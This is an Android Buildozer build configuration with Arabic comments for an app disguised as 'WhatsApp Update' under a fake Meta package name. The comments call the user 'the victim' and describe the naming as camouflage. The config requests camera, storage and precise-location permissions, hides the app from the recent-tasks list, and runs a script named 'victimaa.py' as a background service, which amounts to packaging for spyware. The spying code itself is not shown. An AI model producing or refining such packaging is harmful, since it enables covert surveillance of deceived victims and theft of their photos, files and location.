[app]
# -- اسم التطبيق الذي سيظهر للضحية
title = WhatsApp Update

# -- اسم الحزمة (مهم للتمويه)
package.name = whatsapp_services_v3
package.domain = com.meta.android

# -- المجلد الحالي واسم الملف (v صغيرة كما طلبت)
source.dir = .
source.filename = victimaa.py

# -- الملفات المضمنة في التطبيق
source.include_exts = py,png,jpg,kv,atlas

# -- رقم الإصدار
version = 2.26.2

# -- المتطلبات (تم حذف opencv لضمان نجاح البناء)
requirements = python3,kivy,pyjnius,requests

# -- الأيقونة (يجب أن يكون الملف باسم icon.png)
icon.filename = icon.png

# -- إعدادات الشاشة
orientation = portrait

# -- الأذونات الضرورية (يطلبها التطبيق عند التثبيت)
android.permissions = INTERNET, CAMERA, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, ACCESS_FINE_LOCATION

# -- إخفاء التطبيق من قائمة المهام الأخيرة
android.meta_data = android.no_history=True

# -- مستويات الـ API
android.api = 31
android.minapi = 21

# -- تشغيل الملف كخدمة في الخلفية (v صغيرة)
services = MyService:victimaa.py

# -- لضمان عدم حدوث أخطاء في الـ Gradle
android.accept_sdk_license = True
fullscreen = 0